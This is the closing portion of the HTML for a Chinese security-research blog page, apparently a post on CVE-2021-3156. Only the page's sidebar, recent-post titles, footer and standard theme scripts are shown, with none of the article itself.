            this.page.url = 'https://avcatshy.github.io/2021/09/28/cve-2021-3156-%E5%88%86%E6%9E%90%E7%AC%94%E8%AE%B0%EF%BC%88%E6%9C%89%E5%9D%91%E6%B2%A1%E5%A1%AB%EF%BC%89/';
            this.page.identifier = '2021/09/28/cve-2021-3156-分析笔记（有坑没填）/';
        };
        (function() {
            var d = document, s = d.createElement('script');  
            s.src = '//' + 'vlinkstone' + '.disqus.com/embed.js';
            s.setAttribute('data-timestamp', +new Date());
            (d.head || d.body).appendChild(s);
        })();</script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/img/avatar.png" alt="vlinkstone"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">vlinkstone</p><p class="is-size-6 is-block">Security Noobs</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>CN</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">8</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">5</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">10</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="mailto:vlinkstone@gmail.com" target="_blank" rel="noopener">联系我</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/avcatshy"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com/avcatshy"><i class="fab fa-twitter"></i></a></div></div></div><!--!--><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://jdkhnjggf.github.io/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Iuobobo</span></span><span class="level-right"><span class="level-item tag">jdkhnjggf.github.io</span></span></a></li><li><a class="level is-mobile" href="https://www.zuozuovera.com/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">薇拉航线🌺</span></span><span class="level-right"><span class="level-item tag">www.zuozuovera.com</span></span></a></li></ul></div></div></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/BIN/"><span class="level-start"><span class="level-item">BIN</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/IOT/"><span class="level-start"><span class="level-item">IOT</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/Linux/"><span class="level-start"><span class="level-item">Linux</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/QEMU/"><span class="level-start"><span class="level-item">QEMU</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/iOS/"><span class="level-start"><span class="level-item">iOS</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-09-28T16:00:00.000Z">2021-09-29</time></p><p class="title"><a href="/2021/09/29/Netgear-R6400v2-%E5%9B%BA%E4%BB%B6%E9%87%8D%E6%89%93%E5%8C%85/">Netgear R6400v2 固件重打包</a></p><p class="categories"><a href="/categories/IOT/">IOT</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-09-27T16:00:00.000Z">2021-09-28</time></p><p class="title"><a href="/2021/09/28/cve-2021-3156-%E5%88%86%E6%9E%90%E7%AC%94%E8%AE%B0%EF%BC%88%E6%9C%89%E5%9D%91%E6%B2%A1%E5%A1%AB%EF%BC%89/">cve-2021-3156 分析笔记（有坑没填）</a></p><p class="categories"><a href="/categories/Linux/">Linux</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-07-10T18:17:05.443Z">2021-07-11</time></p><p class="title"><a href="/2021/07/11/%E5%B0%8F%E8%AE%B0iOS%E5%8F%8D%E8%B0%83%E8%AF%95/">小记iOS反调试</a></p><p class="categories"><a href="/categories/iOS/">iOS</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-07-03T15:43:18.545Z">2021-07-03</time></p><p class="title"><a href="/2021/07/03/Zoom-%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">Zoom 简单分析</a></p><p class="categories"><a href="/categories/iOS/">iOS</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-07-03T13:37:55.110Z">2021-07-03</time></p><p class="title"><a href="/2021/07/03/cve-2019-6788-note/">cve-2019-6788 Note</a></p><p class="categories"><a href="/categories/QEMU/">QEMU</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2021/09/"><span class="level-start"><span class="level-item">九月 2021</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/07/"><span class="level-start"><span class="level-item">七月 2021</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/12/"><span class="level-start"><span class="level-item">十二月 2020</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/02/"><span class="level-start"><span class="level-item">二月 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/Bin/"><span class="tag">Bin</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Linux/"><span class="tag">Linux</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/NETGEAR/"><span class="tag">NETGEAR</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Netgear/"><span class="tag">Netgear</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/QEMU/"><span class="tag">QEMU</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Router/"><span class="tag">Router</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Security/"><span class="tag">Security</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/iOS/"><span class="tag">iOS</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/iot/"><span class="tag">iot</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/router/"><span class="tag">router</span><span class="tag">1</span></a></div></div></div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">订阅更新</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="订阅"></div></div></form></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="https://avatars.githubusercontent.com/u/20829507?s=60&amp;v=4" alt="avcatshy" height="28"></a><p class="is-size-7"><span>&copy; 2021 vlinkstone</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "此网站使用Cookie来改善您的体验。",
          dismiss: "知道了！",
          allow: "允许使用Cookie",
          deny: "拒绝",
          link: "了解更多",
          policy: "Cookie政策",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><!--!--></body></html>